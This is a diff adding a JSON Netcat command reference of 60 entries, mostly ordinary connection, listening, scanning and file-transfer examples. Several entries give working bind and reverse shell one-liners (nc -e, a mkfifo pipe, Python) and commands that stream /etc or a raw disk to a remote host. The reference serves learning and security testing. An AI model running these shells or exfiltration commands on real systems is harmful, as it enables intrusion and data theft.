@@ -1,0 +1,427 @@
+{
+  "tool": "netcat",
+  "description": "Complete Netcat command reference covering all options from basic to advanced",
+  "total_commands": 60,
+  "commands": [
+    {
+      "id": 1,
+      "category": "Basic TCP Connections",
+      "command": "nc 192.168.1.1 80",
+      "example": "nc 192.168.1.1 80",
+      "explanation": "Connects to the target host on port 80 using TCP."
+    },
+    {
+      "id": 2,
+      "category": "Basic TCP Connections",
+      "command": "nc -v 192.168.1.1 22",
+      "example": "nc -v 192.168.1.1 22",
+      "explanation": "Connects to the target with verbose output to see connection status."
+    },
+    {
+      "id": 3,
+      "category": "Basic TCP Connections",
+      "command": "nc -v -n 192.168.1.1 80",
+      "example": "nc -v -n 192.168.1.1 80",
+      "explanation": "Connects without performing DNS resolution for faster interaction."
+    },
+    {
+      "id": 4,
+      "category": "UDP Connections",
+      "command": "nc -u 192.168.1.1 53",
+      "example": "nc -u 192.168.1.1 53",
+      "explanation": "Establishes a connection using UDP instead of the default TCP."
+    },
+    {
+      "id": 5,
+      "category": "UDP Connections",
+      "command": "nc -u -v 192.168.1.1 161",
+      "example": "nc -u -v 192.168.1.1 161",
+      "explanation": "Connects via UDP with verbose feedback to check connection status."
+    },
+    {
+      "id": 6,
+      "category": "Listening Mode",
+      "command": "nc -l -p 4444",
+      "example": "nc -l -p 4444",
+      "explanation": "Starts a listener on TCP port 4444 to await incoming connections."
+    },
+    {
+      "id": 7,
+      "category": "Listening Mode",
+      "command": "nc -l -v -p 4444",
+      "example": "nc -l -v -p 4444",
+      "explanation": "Listens on port 4444 and prints verbose details when a client connects."
+    },
+    {
+      "id": 8,
+      "category": "Listening Mode",
+      "command": "nc -u -l -p 5000",
+      "example": "nc -u -l -p 5000",
+      "explanation": "Starts a UDP listener on port 5000 for receiving UDP packets."
+    },
+    {
+      "id": 9,
+      "category": "Port Scanning",
+      "command": "nc -z -v 192.168.1.1 20-80",
+      "example": "nc -z -v 192.168.1.1 20-80",
+      "explanation": "Scans TCP ports 20 through 80 in Zero-I/O mode to identify open ports."
+    },
+    {
+      "id": 10,
+      "category": "Port Scanning",
+      "command": "nc -z -v -u 192.168.1.1 1-100",
+      "example": "nc -z -v -u 192.168.1.1 1-100",
+      "explanation": "Scans UDP ports 1 through 100 to identify listening services."
+    },
+    {
+      "id": 11,
+      "category": "Port Scanning",
+      "command": "nc -z -v -w 1 192.168.1.1 80 443 8080",
+      "example": "nc -z -v -w 1 192.168.1.1 80 443 8080",
+      "explanation": "Scans specific individual ports with a 1-second timeout per port."
+    },
+    {
+      "id": 12,
+      "category": "Banner Grabbing",
+      "command": "echo '' | nc -v -n -w 1 192.168.1.1 22",
+      "example": "echo '' | nc -v -n -w 1 192.168.1.1 22",
+      "explanation": "Connects briefly to capture the service banner sent by the target."
+    },
+    {
+      "id": 13,
+      "category": "Banner Grabbing",
+      "command": "printf 'HEAD / HTTP/1.0\\r\\n\\r\\n' | nc 192.168.1.1 80",
+      "example": "printf 'HEAD / HTTP/1.0\\r\\n\\r\\n' | nc 192.168.1.1 80",
+      "explanation": "Sends a raw HTTP HEAD request to grab the web server version header."
+    },
+    {
+      "id": 14,
+      "category": "File Transfer (Receive)",
+      "command": "nc -l -p 1234 > received_file.txt",
+      "example": "nc -l -p 1234 > received_file.txt",
+      "explanation": "Listens on port 1234 and writes all incoming data to a file."
+    },
+    {
+      "id": 15,
+      "category": "File Transfer (Send)",
+      "command": "nc 192.168.1.1 1234 < file_to_send.txt",
+      "example": "nc 192.168.1.1 1234 < file_to_send.txt",
+      "explanation": "Connects to the receiver and sends the contents of a local file."
+    },
+    {
+      "id": 16,
+      "category": "Timeout and Connection Control",
+      "command": "nc -w 5 192.168.1.1 80",
+      "example": "nc -w 5 192.168.1.1 80",
+      "explanation": "Connects to the target but times out if the connection remains idle for 5 seconds."
+    },
+    {
+      "id": 17,
+      "category": "Input and Output Redirection",
+      "command": "nc 192.168.1.1 25 << EOF\nHELO test.com\nQUIT\nEOF",
+      "example": "nc 192.168.1.1 25 << EOF\nHELO test.com\nQUIT\nEOF",
+      "explanation": "Feeds a multi-line HERE-doc string into the netcat connection automatically."
+    },
+    {
+      "id": 18,
+      "category": "Keep Alive and Persistent Connections",
+      "command": "nc -k -l -p 8080",
+      "example": "nc -k -l -p 8080",
+      "explanation": "Listens on port 8080 and keeps listening even after the client disconnects."
+    },
+    {
+      "id": 19,
+      "category": "Source Port and Interface Binding",
+      "command": "nc -p 5000 192.168.1.1 80",
+      "example": "nc -p 5000 192.168.1.1 80",
+      "explanation": "Connects to the target while forcing the local source port to be 5000."
+    },
+    {
+      "id": 20,
+      "category": "Source Port and Interface Binding",
+      "command": "nc -s 10.10.10.10 192.168.1.1 80",
+      "example": "nc -s 10.10.10.10 192.168.1.1 80",
+      "explanation": "Spoofs or binds the source IP address to a specific interface IP."
+    },
+    {
+      "id": 21,
+      "category": "IPv6 Connections",
+      "command": "nc -6 2001:db8::1 80",
+      "example": "nc -6 2001:db8::1 80",
+      "explanation": "Forces Netcat to use IPv6 protocols to connect to the target address."
+    },
+    {
+      "id": 22,
+      "category": "IPv6 Connections",
+      "command": "nc -6 -l -p 5000",
+      "example": "nc -6 -l -p 5000",
+      "explanation": "Starts a listener specifically on an IPv6 address/interface on port 5000."
+    },
+    {
+      "id": 23,
+      "category": "Quiet and Verbose Modes",
+      "command": "nc -vv 192.168.1.1 80",
+      "example": "nc -vv 192.168.1.1 80",
+      "explanation": "Connects with very verbose output for deep debugging of the connection handshake."
+    },
+    {
+      "id": 24,
+      "category": "Automation and Scripting Usage",
+      "command": "nc -i 2 192.168.1.1 80",
+      "example": "nc -i 2 192.168.1.1 80",
+      "explanation": "Inserts a 2-second delay interval between lines of text sent or received."
+    },
+    {
+      "id": 25,
+      "category": "Executing Commands (Bind Shell)",
+      "command": "nc -l -p 4444 -e /bin/bash",
+      "example": "nc -l -p 4444 -e /bin/bash",
+      "explanation": "Listens on port 4444 and executes bash for whoever connects (insecure)."
+    },
+    {
+      "id": 26,
+      "category": "Executing Commands (Reverse Shell)",
+      "command": "nc 10.10.10.10 4444 -e /bin/bash",
+      "example": "nc 10.10.10.10 4444 -e /bin/bash",
+      "explanation": "Connects to a listener and executes a shell, sending control to the remote user."
+    },
+    {
+      "id": 27,
+      "category": "Executing Commands (OpenBSD Workaround)",
+      "command": "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.10.10 4444 > /tmp/f",
+      "example": "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.10.10 4444 > /tmp/f",
+      "explanation": "Creates a reverse shell using named pipes for Netcat versions without the -e flag."
+    },
+    {
+      "id": 28,
+      "category": "Debugging and Troubleshooting",
+      "command": "nc -v -z -w 2 192.168.1.1 1-65535",
+      "example": "nc -v -z -w 2 192.168.1.1 1-65535",
+      "explanation": "Performs a full TCP port scan with verbose output to identify all open services."
+    },
+    {
+      "id": 29,
+      "category": "Firewall and Service Testing",
+      "command": "nc -l -p 80",
+      "example": "sudo nc -l -p 80",
+      "explanation": "Simulates a web server listener to test if a firewall permits inbound port 80 traffic."
+    },
+    {
+      "id": 30,
+      "category": "Encryption via External Tools",
+      "command": "ncat --ssl -l -p 4444",
+      "example": "ncat --ssl -l -p 4444",
+      "explanation": "Uses Nmap's Ncat (modern sibling) to listen with SSL encryption enabled."
+    },
+    {
+      "id": 31,
+      "category": "Encryption via External Tools",
+      "command": "ncat --ssl 192.168.1.1 4444",
+      "example": "ncat --ssl 192.168.1.1 4444",
+      "explanation": "Connects to an SSL-enabled listener using Nmap's Ncat variant."
+    },
+    {
+      "id": 32,
+      "category": "Proxy Usage",
+      "command": "nc -x 127.0.0.1:9050 -X 5 192.168.1.1 80",
+      "example": "nc -x 127.0.0.1:9050 -X 5 192.168.1.1 80",
+      "explanation": "Connects to the target via a SOCKS5 proxy (e.g., Tor) at the specified address."
+    },
+    {
+      "id": 33,
+      "category": "Proxy Usage",
+      "command": "nc -x 10.10.10.1:8080 -X connect 192.168.1.1 80",
+      "example": "nc -x 10.10.10.1:8080 -X connect 192.168.1.1 80",
+      "explanation": "Connects to the target via an HTTP CONNECT proxy."
+    },
+    {
+      "id": 34,
+      "category": "Unix Domain Sockets",
+      "command": "nc -U /var/run/docker.sock",
+      "example": "sudo nc -U /var/run/docker.sock",
+      "explanation": "Connects to a Unix Domain Socket instead of a network TCP/UDP port."
+    },
+    {
+      "id": 35,
+      "category": "Unix Domain Sockets",
+      "command": "nc -l -U /tmp/socket_test",
+      "example": "nc -l -U /tmp/socket_test",
+      "explanation": "Creates and listens on a Unix Domain Socket for local inter-process communication."
+    },
+    {
+      "id": 36,
+      "category": "Logging and Output Handling",
+      "command": "nc -v 192.168.1.1 80 2> connection_log.txt",
+      "example": "nc -v 192.168.1.1 80 2> connection_log.txt",
+      "explanation": "Redirects verbose status messages (stderr) to a log file while keeping data on stdout."
+    },
+    {
+      "id": 37,
+      "category": "Red Team Post Exploitation",
+      "command": "tar cf - /etc | nc 10.10.10.10 1234",
+      "example": "tar cf - /etc | nc 10.10.10.10 1234",
+      "explanation": "Compresses the /etc directory and streams it directly to a remote listener (Data Exfiltration)."
+    },
+    {
+      "id": 38,
+      "category": "Red Team Post Exploitation",
+      "command": "nc -l -p 1234 | tar xf -",
+      "example": "nc -l -p 1234 | tar xf -",
+      "explanation": "Listens for an incoming stream and immediately extracts the archive to disk."
+    },
+    {
+      "id": 39,
+      "category": "Red Team Post Exploitation",
+      "command": "dd if=/dev/sda | nc 10.10.10.10 9000",
+      "example": "dd if=/dev/sda | nc 10.10.10.10 9000",
+      "explanation": "Clones a raw disk image and streams it over the network for forensic capture."
+    },
+    {
+      "id": 40,
+      "category": "Blue Team Validation",
+      "command": "while true; do nc -l -p 80 -q 1 < response.html; done",
+      "example": "while true; do nc -l -p 80 -q 1 < response.html; done",
+      "explanation": "Runs a simple loop to serve a static HTML file persistently (Simple Web Server)."
+    },
+    {
+      "id": 41,
+      "category": "Blue Team Validation",
+      "command": "nc -z 192.168.1.1 1-1024 2>&1 | grep succeeded",
+      "example": "nc -z 192.168.1.1 1-1024 2>&1 | grep succeeded",
+      "explanation": "Scans ports and filters output to show only successfully connected ports."
+    },
+    {
+      "id": 42,
+      "category": "Chat Mode",
+      "command": "nc -l -p 3333",
+      "example": "User A: nc -l -p 3333",
+      "explanation": "Starts a simple text chat server."
+    },
+    {
+      "id": 43,
+      "category": "Chat Mode",
+      "command": "nc 192.168.1.1 3333",
+      "example": "User B: nc 192.168.1.1 3333",
+      "explanation": "Connects to the chat server for manual text communication."
+    },
+    {
+      "id": 44,
+      "category": "Advanced Triggering",
+      "command": "nc -l -p 5555 -c '/bin/bash script.sh'",
+      "example": "nc -l -p 5555 -c '/bin/bash script.sh'",
+      "explanation": "Executes a shell script via /bin/sh upon connection (Traditional netcat only)."
+    },
+    {
+      "id": 45,
+      "category": "Port Scanning (Randomized)",
+      "command": "nc -v -r -z 192.168.1.1 20-80",
+      "example": "nc -v -r -z 192.168.1.1 20-80",
+      "explanation": "Scans ports 20-80 in a randomized order to potentially evade simple detection logic."
+    },
+    {
+      "id": 46,
+      "category": "Connection Control",
+      "command": "nc -q 5 192.168.1.1 80 < input.txt",
+      "example": "nc -q 5 192.168.1.1 80 < input.txt",
+      "explanation": "Sends a file and waits 5 seconds after EOF before closing the connection."
+    },
+    {
+      "id": 47,
+      "category": "Broadcast",
+      "command": "nc -b -u 255.255.255.255 1234",
+      "example": "nc -b -u 255.255.255.255 1234",
+      "explanation": "Allows sending UDP packets to the broadcast address (requires support in binary)."
+    },
+    {
+      "id": 48,
+      "category": "Telnet Negotiation",
+      "command": "nc -t 192.168.1.1 23",
+      "example": "nc -t 192.168.1.1 23",
+      "explanation": "Enables Telnet negotiation handling for connecting to Telnet servers."
+    },
+    {
+      "id": 49,
+      "category": "Buffer Size Adjustment",
+      "command": "nc -I 1024 192.168.1.1 80",
+      "example": "nc -I 1024 192.168.1.1 80",
+      "explanation": "Sets the TCP receive buffer size to 1024 bytes (useful for flow control testing)."
+    },
+    {
+      "id": 50,
+      "category": "Listening Mode (No DNS)",
+      "command": "nc -n -l -p 4444",
+      "example": "nc -n -l -p 4444",
+      "explanation": "Listens on port 4444 and prevents DNS lookup of the connecting IP for speed."
+    },
+    {
+      "id": 51,
+      "category": "Port Scanning (Wait Mode)",
+      "command": "nc -w 1 -z 192.168.1.1 80-85",
+      "example": "nc -w 1 -z 192.168.1.1 80-85",
+      "explanation": "Scans a small range with a strict 1-second timeout per port to prevent hanging."
+    },
+    {
+      "id": 52,
+      "category": "Simple HTTP Server",
+      "command": "printf 'HTTP/1.1 200 OK\\n\\nHello World' | nc -l -p 8080",
+      "example": "printf 'HTTP/1.1 200 OK\\n\\nHello World' | nc -l -p 8080",
+      "explanation": "Responds with a valid HTTP 200 OK message to a single browser request."
+    },
+    {
+      "id": 53,
+      "category": "Mail Server Testing",
+      "command": "nc -C 192.168.1.1 25",
+      "example": "nc -C 192.168.1.1 25",
+      "explanation": "Connects to SMTP and forces CRLF line endings (required by some mail servers)."
+    },
+    {
+      "id": 54,
+      "category": "Reverse Shell (Python Assisted)",
+      "command": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.10\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+      "example": "python -c '...' (See command field)",
+      "explanation": "Uses Python to spawn a reverse shell if Netcat -e is unavailable."
+    },
+    {
+      "id": 55,
+      "category": "Monitoring",
+      "command": "nc -l -p 514 | tee syslog_capture.log",
+      "example": "nc -l -u -p 514 | tee syslog_capture.log",
+      "explanation": "Acts as a Syslog receiver on UDP 514 and displays logs while saving to file."
+    },
+    {
+      "id": 56,
+      "category": "Background Listening",
+      "command": "nc -d -l -p 1234",
+      "example": "nc -d -l -p 1234",
+      "explanation": "Listens on port 1234 but ignores stdin (prevents closing on terminal input)."
+    },
+    {
+      "id": 57,
+      "category": "Connection Control (Shutdown)",
+      "command": "nc -N 192.168.1.1 80",
+      "example": "echo 'GET / HTTP/1.0' | nc -N 192.168.1.1 80",
+      "explanation": "Shutdowns the network socket for writing after stdin closes (useful for HTTP)."
+    },
+    {
+      "id": 58,
+      "category": "Traffic Shaping",
+      "command": "nc -T lowdelay 192.168.1.1 80",
+      "example": "nc -T lowdelay 192.168.1.1 80",
+      "explanation": "Sets the IP TOS (Type of Service) byte to 'lowdelay' for traffic prioritization."
+    },
+    {
+      "id": 59,
+      "category": "Proxy Usage (SOCKS4)",
+      "command": "nc -x 127.0.0.1:1080 -X 4 192.168.1.1 80",
+      "example": "nc -x 127.0.0.1:1080 -X 4 192.168.1.1 80",
+      "explanation": "Connects to the target through a specific SOCKS4 proxy."
+    },
+    {
+      "id": 60,
+      "category": "Advanced Relaying",
+      "command": "mknod backpipe p && nc -l -p 8080 0<backpipe | nc 192.168.1.1 80 1>backpipe",
+      "example": "mknod backpipe p && nc -l -p 8080 0<backpipe | nc 192.168.1.1 80 1>backpipe",
+      "explanation": "Creates a manual port forwarder using a named pipe to relay traffic between ports."
+    }
+  ]
+}
